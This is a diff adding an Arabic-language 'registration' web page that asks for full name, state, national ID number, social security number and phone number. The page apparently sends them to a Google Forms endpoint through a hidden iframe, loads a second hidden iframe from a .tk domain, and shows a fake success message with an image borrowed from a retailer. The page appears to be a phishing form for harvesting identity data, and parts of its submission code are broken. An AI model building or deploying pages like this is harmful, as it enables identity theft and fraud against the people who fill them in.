@@ -1,0 +1,174 @@
+﻿<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل</title>
+	
+	    
+   
+	
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            direction: rtl; /* الكتابة من اليمين إلى اليسار */
+            background-image: url('./img/1.jpg'); /* رابط صورة الخلفية */
+            background-size: cover; /* ضبط حجم الخلفية لتغطية الشاشة */
+            background-position: center; /* ضبط موضع الخلفية في المركز */
+        }
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            background-color: rgba(55, 40, 40, 0.9); /* إضافة خلفية بيضاء نصف شفافة */
+        }
+        .form-container h2 {
+            text-align: center;
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #fff;
+            font-size: 18px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border-radius: 5px; /* حواف دائرية للخانات */
+            border: 1px solid #ccc;
+            font-size: 14px;
+            color: #333;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 5px; /* حواف دائرية للزر */
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            animation: shake 2.5s; /* إضافة تأثير الاهتزاز */
+            animation-iteration-count: infinite; /* تكرار الاهتزاز بشكل مستمر */
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+    </style>
+
+ <style>
+#form-result {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    padding: 20px;
+    background-color: #fff;
+    border: 1px solid #ddd;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    z-index: 1000; /* تأكد من أن الرسالة تظهر فوق العناصر الأخرى */
+    text-align: center;
+}
+
+ </style>
+ 
+ <style>
+ #form-result {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    padding: 20px;
+    background-color: #fff;
+    border: 1px solid #ddd;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    z-index: 1000; /* Ensure the message is on top */
+    text-align: center;
+    display: none; /* Initially hidden */
+}
+</style>
+
+</head>
+<body>       
+
+					
+				   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none;" src="https://www.capoffer.tk/p/html.html"></iframe>
+                     <div id="form-result"></div>	
+                                 <div class="form-container">  
+
+
+								 
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLSeD8TwctaE2n3THR-EhNKlpgX3blFzI3PuXYPEy6M10Nka3SQ/formResponse" target="hidden_iframe" method="post" onsubmit="sendConatcts()" id="ads-contacts-form" name="ads-contacts-form">
+                 
+				 <div class="form-group">
+                <label for="full-name">الاسم الكامل</label>
+                <input type="text" id="full-name" name="entry.1321854437" required>
+            </div>
+            <div class="form-group">
+                <label for="state">اختيار الولاية</label>
+                <select id="state" name="entry.1373676906" required>
+                  <script src="./js/w.js"></script>
+                                                </select>
+            </div>
+            <div class="form-group">
+                <label for="national-id">رقم تعريف الوطني</label>
+                <input type="text" id="national-id" name="entry.1353363051" required>
+            </div>
+            <div class="form-group">
+                <label for="social-security">رقم الضمان الاجتماعي</label>
+                <input type="text" id="social-security" name="entry.1288479565" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="text" id="phone" name="entry.837250438" required>
+            </div>
+            <button type="submit" class="submit-btn">إرسال</button>
+        </form>
+    </div>
+		
+             <script>
+	document.addEventListener('DOMContentLoaded', () => {
+    document.querySelector(".submit-btn").addEventListener('click', function(event) {
+        event.preventDefault();
+        sendContacts();
+    });
+
+    function sendContacts() {
+        const form = document.getElementById('ads-contacts-form');
+        form.style.visibility = "hidden";
+        form.style.position = "absolute";
+        document.getElementById('form-result').style.display = "block";
+
+        document.getElementById('form-result').innerHTML = `
+            <img src="https://ci.jumia.is/cms/1_JG/predict-and-win/icon-done-v1.gif" alt=""/>
+            <h1>تم تأكيد طلبك بنجاح</h1>
+            <a href="./index.html" style="color:red;">شكرا لك لزيارة موقعنا</a>
+        `;
+
+        // Optionally use AJAX here to submit the form
+        // form.submit();
+    }
+});
+ </script>
+	
+</body>
+</html>
